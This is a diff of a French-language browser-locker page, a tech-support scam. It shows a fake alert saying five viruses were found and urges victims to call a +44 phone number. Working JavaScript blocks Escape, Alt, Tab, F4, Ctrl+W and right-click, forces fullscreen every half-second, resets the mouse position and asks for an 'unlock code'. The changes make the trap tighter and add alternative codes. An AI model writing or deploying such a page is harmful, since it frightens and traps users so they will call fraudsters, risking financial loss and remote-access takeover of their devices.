@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
+<!DOCTYPE html><html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -10,7 +9,7 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
-            cursor: none; /* Désactive totalement le pointeur */
+            cursor: none;
         }
         html, body {
             width: 100vw;
@@ -34,20 +33,20 @@
             padding: 5%;
         }
         .message {
-            font-size: 3vw; /* Taille de police réduite */
+            font-size: 3vw;
             font-weight: bold;
         }
         .alert-number {
-            font-size: 2.5vw; /* Taille de police réduite */
+            font-size: 2.5vw;
             font-weight: bold;
             color: red;
         }
         #codeInput {
             margin-top: 20px;
-            padding: 10px; /* Taille de police réduite */
-            font-size: 2vw; /* Taille de police réduite */
+            padding: 10px;
+            font-size: 2vw;
             text-align: center;
-            border: 2px solid white; /* Taille de bordure réduite */
+            border: 2px solid white;
             width: 50%;
             background: black;
             color: white;
@@ -55,7 +54,7 @@
         }
         #error-message {
             color: red;
-            font-size: 1.5vw; /* Taille de police réduite */
+            font-size: 1.5vw;
             margin-top: 10px;
             animation: shake 0.5s;
             animation-iteration-count: 1;
@@ -67,51 +66,16 @@
             75% { transform: translateX(-5px); }
             100% { transform: translateX(0); }
         }
-        .glitch {
-            position: relative;
-            color: white;
-            font-size: 2vw; /* Taille de police réduite */
-            animation: glitch 1s infinite;
-        }
-        @keyframes glitch {
-            0% {
-                text-shadow: 2px 2px red, -2px -2px blue;
-            }
-            25% {
-                text-shadow: -2px 2px red, 2px -2px blue;
-            }
-            50% {
-                text-shadow: 2px -2px red, -2px 2px blue;
-            }
-            75% {
-                text-shadow: -2px -2px red, 2px 2px blue;
-            }
-            100% {
-                text-shadow: 2px 2px red, -2px -2px blue;
-            }
-        }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false" onkeydown="return blockKeys(event)">
     <div class="container">
-        <p class="message"> 🚨 ATTENTION ! 🚨
-5 VIRUS DÉTECTÉS SUR VOTRE APPAREIL !
-🛑 Votre système est compromis ! 🛑
-🔴 Ne fermez PAS cette page ! 🔴
-🔴 Ne redémarrez PAS votre appareil ! 🔴
-📛 Votre appareil est exposé à une attaque sérieuse ! 📛
-Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risquent d’être volées à tout moment.   <br>Appelez immédiatement :</p>
+        <p class="message"> 🚨 ATTENTION ! 🚨<br>5 VIRUS DÉTECTÉS SUR VOTRE APPAREIL !<br>🛑 Votre système est compromis ! 🛑</p>
         <p class="alert-number">+44 741 30 52 610</p>
-        <p style="font-size: 2vw;">Entrez le code de déverrouillage :</p> <!-- Taille de police réduite -->
+        <p style="font-size: 2vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
-        <p id="error-message" class="glitch"></p>
+        <p id="error-message"></p>
     </div>
-    <audio id="keypress-sound">
-        <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
-    </audio>
-    <audio id="error-sound">
-        <source src="https://www.soundjay.com/button/beep-10.wav" type="audio/wav">
-    </audio>
     <script>
         function openFullscreen() {
             let elem = document.documentElement;
@@ -124,86 +88,57 @@ Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risq
             } else if (elem.msRequestFullscreen) {
                 elem.msRequestFullscreen();
             }
+        }function blockKeys(event) {
+        let blockedKeys = ["Escape", "Tab", "F11", "F4", "Alt", "Control", "Meta", "Backspace"].filter(key => !["d", "a", "k", "r"].includes(key.toLowerCase()));
+        if (blockedKeys.includes(event.key) || (event.ctrlKey && event.key === "w")) {
+            event.preventDefault();
+            return false;
         }
+    }
+    
+    document.addEventListener("fullscreenchange", function() {
+        if (!document.fullscreenElement) {
+            openFullscreen();
+        }
+    });
+    
+    let inputField = document.getElementById("codeInput");
+    let errorMessage = document.getElementById("error-message");
+    
+    inputField.addEventListener("keyup", function(event) {
+        if (event.key === "Enter") {
+            if (this.value === "1234" || this.value === "2012" || this.value.toLowerCase() === "dakar") {
+                document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 3vw;'>Système restauré</h1>";
+            } else {
+                errorMessage.innerText = "Code incorrect !";
+                errorMessage.classList.add("shake");
+                setTimeout(() => errorMessage.classList.remove("shake"), 500);
+                this.value = "";
+            }
+        }
+    });
+    
+    window.onload = function() {
         openFullscreen();
+        inputField.focus();
+        repositionMouse();
+    };
+    
+    function repositionMouse() {
+        let x = 0;
+        let y = 0;
+        let event = new MouseEvent("mousemove", {
+            bubbles: true,
+            cancelable: true,
+            clientX: x,
+            clientY: y
+        });
+        document.dispatchEvent(event);
+    }
+    
+    setInterval(openFullscreen, 500);
+    setInterval(repositionMouse, 100);
+</script>
 
-        // Bloquer tous les raccourcis clavier
-        document.addEventListener("keydown", function(event) {
-            let blockedKeys = ["Escape", "Tab", "F11", "F4", "Alt", "Control", "Meta"];
-            if (blockedKeys.includes(event.key) || (event.ctrlKey && event.key === "w")) {
-                event.preventDefault();
-                return false;
-            }
-        });
-
-        // Désactiver totalement la touche Échap
-        window.addEventListener("keydown", function(event) {
-            if (event.key === "Escape") {
-                event.preventDefault();
-                return false;
-            }
-        });
-
-        // Désactiver complètement la souris
-        window.addEventListener("mousemove", function(event) {
-            event.preventDefault();
-        });
-        window.addEventListener("mousedown", function(event) {
-            event.preventDefault();
-        });
-        window.addEventListener("mouseup", function(event) {
-            event.preventDefault();
-        });
-        window.addEventListener("contextmenu", function(event) {
-            event.preventDefault();
-        });
-        window.addEventListener("wheel", function(event) {
-            event.preventDefault();
-        });
-
-        // Empêcher la sortie du plein écran
-        document.addEventListener("fullscreenchange", function() {
-            if (!document.fullscreenElement) {
-                openFullscreen();
-            }
-        });
-
-        // Ajouter un son à chaque touche pressée
-        let inputField = document.getElementById("codeInput");
-        let errorMessage = document.getElementById("error-message");
-        let sound = document.getElementById("keypress-sound");
-        let errorSound = document.getElementById("error-sound");
-
-        inputField.addEventListener("keydown", function(event) {
-            if (!["Enter", "Backspace"].includes(event.key)) {
-                sound.play();
-            }
-        });
-
-        // Vérifier le code
-        inputField.addEventListener("keyup", function(event) {
-            if (event.key === "Enter") {
-                if (this.value === "1234") {
-                    document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 3vw;'>  Système restauré</h1>"; /* Taille de police réduite */
-                } else {
-                    errorMessage.innerText = "Code incorrect !";
-                    errorMessage.classList.remove("glitch");
-                    void errorMessage.offsetWidth; // Reset animation
-                    errorMessage.classList.add("glitch");
-                    errorSound.play();
-                    this.value = "";
-                }
-            }
-        });
-
-        // Focus automatique sur le champ
-        window.onload = function() {
-            inputField.focus();
-        };
-
-        // Reforcer le plein écran toutes les 2 secondes
-        setInterval(openFullscreen, 2000);
-    </script>
 </body>
 </html>
- 
